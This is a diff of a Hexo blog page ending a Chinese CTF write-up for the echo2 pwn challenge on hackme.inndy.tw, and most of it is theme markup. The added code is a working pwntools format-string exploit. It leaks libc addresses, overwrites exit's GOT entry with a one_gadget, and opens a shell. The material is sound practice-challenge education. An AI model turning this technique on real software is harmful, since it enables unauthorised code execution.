+p = remote(&quot;hackme.inndy.tw&quot;,7712)
+#p = process(&#39;./echo2&#39;)
+elf = ELF(&#39;./echo2&#39;)
+exit_got = elf.got[&#39;exit&#39;]
+
+def memleak(offset):
+    payload = &#39;%&#39; + str(offset) + &quot;$p&quot;
+    p.sendline(payload)
+    data = p.recv()[0:-1]
+    print data
+    data = int(data,16)
+    return data
+
+log.info(&quot;************leak program base address************&quot;)
+_libc_csu_init = memleak(41)
+p_add = _libc_csu_init - 0xa03
+print &quot;base address --&gt;[%s]&quot;%hex(p_add)
+
+
+_libc_start_main_add = memleak(43) - 240
+print &quot;_libc_start_main_add --&gt;[%s]&quot;%hex(_libc_start_main_add)
+_libc_start_main_offset = 0x20740
+print &quot;_libc_start_main_offset --&gt; [%s] &quot;%hex(_libc_start_main_offset)
+libc_base = _libc_start_main_add - _libc_start_main_offset
+print &quot;libc_base --&gt; [%s]&quot;%hex(libc_base) 
+
+one_gadget = 0xf0897#execve(&quot;/bin/sh&quot;,null,environ)
+#one_gadget = 0xf02a4
+print &quot;one_gadget --&gt; [%s]&quot;%hex(one_gadget)
+one_gadget_add = libc_base + one_gadget
+print &quot;on_gadget_add --&gt; [%s]&quot;%hex(one_gadget_add)
+
+log.info(&quot;*********write execve address to exit_got*******&quot;)
+exit_got = p_add + exit_got
+print &quot;exit_got --&gt; [%s]&quot;%hex(exit_got)
+hex_one_gadget = hex(one_gadget_add)
+add1 = str(int(int(hex_one_gadget[-4:],16))-19)
+add2 = str(int(int(hex_one_gadget[-8:-4],16))-19)
+add3 = str(int(int(hex_one_gadget[-12:-8],16))-19)
+
+payload1 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add1 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got)
+payload2 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add2 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+2)
+payload3 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add3 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+4)
+p.sendline(payload1)
+p.sendline(payload2)
+p.sendline(payload3)
+p.send(&quot;exit\n&quot;)
+p.interactive()
+
+</code></pre><p>结果：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-9062b4e5cb322ffb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>写echo2的时候参考了大佬的<a href="https://blog.csdn.net/niexinming/article/details/78512274#commentsedit" target="_blank" rel="noopener">writeup</a></p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
-
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/05/10/2018-5-10-echo-和-echo2-writeup/" title="echo 和 echo2 writeup">http://yoursite.com/2018/05/10/2018-5-10-echo-和-echo2-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/05/09/2018-5-9-homework-writeup/" rel="next" title="homework writeup">
-                <i class="fa fa-chevron-left"></i> homework writeup
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/11/2018-5-11-rsbo-1-和-rsbo-2-writeup/" rel="prev" title="rsbo-1 和 rsbo-2 writeup">
-                rsbo-1 和 rsbo-2 writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/hackme-inndy-writeup/">hackme.inndy_writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#echo"><span class="nav-number">1.</span> <span class="nav-text">echo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#echo2"><span class="nav-number">2.</span> <span class="nav-text">echo2</span></a></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "echo 和 echo2 writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
